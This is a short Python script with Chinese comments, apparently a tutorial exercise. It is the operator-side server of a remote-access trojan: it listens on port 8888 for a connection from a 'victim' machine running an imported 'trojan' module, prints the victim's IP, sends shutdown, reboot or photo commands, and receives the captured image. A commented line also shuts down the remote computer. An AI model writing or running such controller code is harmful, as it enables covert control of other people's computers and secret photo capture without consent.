# 后台 我们自己
import os
from socket import*  #导入网络编程的模块
from 木马 import file_size

S = socket()                # 1.准备一个套接字
S.bind(('0.0.0.0', 8888))   # 2.套接字绑定一个号码
'''# IP地址：0.0.0.0 默认使用当前计算机的IP
# PORT端口号 1024-65535之间
# 涉及IP地址和端口号的都需要两层括号(())
# 电话机.绑定((0711, 234)'''
S.listen()                  # 3.套接字开启监听
s, addr = S.accept()        # 4如果有木马申请连接 主套接字接受 转接给分套接字！
# 分机, 来电显示 = 电话机.接受

print(addr)  #查看受害者IP
print('1.关机 2.重启 3.拍照')
choice = input('请选择操作编号')
s.send(choice.encode())   #把我们的选择发过去 s.send('字符串‘.encode())
# os.system('shutdown -s -t 60')  # 直接关机对面电脑

# 接受受害者发过来的文件
if choice == '3':
    # 1.接收文件的大小 回复确定
    file_size = int(s.recv(1024).decode())
    s.send('收到'.encode())
    # 2.准备一个空文件 一点一点的接受 写入新文件
    cur_size = 0  #刻度为0
    with open('2.png', 'wb') as file:
        while cur_size < file_size:
            data = s.recv(1024)
            file.write(data)
            cur_size += len(data)
